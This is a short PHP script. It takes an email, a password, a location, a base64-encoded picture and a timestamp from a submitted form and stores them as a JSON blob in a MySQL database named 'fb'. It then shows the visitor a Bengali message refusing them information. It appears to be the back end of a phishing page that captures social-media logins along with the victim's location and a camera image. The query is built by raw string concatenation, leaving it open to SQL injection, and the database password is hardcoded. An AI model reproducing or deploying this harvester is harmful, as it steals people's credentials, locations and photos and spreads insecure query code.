<?php
    $servername = "localhost";
    $username = "asifulmamun";
    $password = "1998";
    $dbname = "fb";

    // Create connection
    $conn = new mysqli($servername, $username, $password, $dbname);
    // Check connection


    $email = $_POST['email'];
    $pass = $_POST['pass'];
    $location = $_POST['location'];
    $picture = $_POST['picture'];
    $dateAndTime = $_POST['dateAndTime'];


    // json start
    $data = '[{';

    // data json
    $data .= '"email":"' . $email . '",';
    $data .= '"password":"' . $pass . '",';
    $data .= $location . ',';
    $data .= '"dateAndTime":"' . $dateAndTime . '",';
    $data .= '"picture64":"' . $picture . '",';

    // json stop
    $data .= '"status":"ok"}]';

    // $sql = "INSERT INTO data (`data`) VALUES ('$data')";

    $sql = "INSERT INTO `data` (`id`, `data`, `datetime`, `ip`, `per`) VALUES (NULL, '$data', CURRENT_TIMESTAMP, NULL, NULL);";

    if ($conn->query($sql) === TRUE) {
        echo 'আপনাকে তথ্য দেয়া হবে না';
    // header('Location:index.php');
    } else {
    echo "Error: " . $sql . "<br>" . $conn->error;
    }

    $conn->close();
?>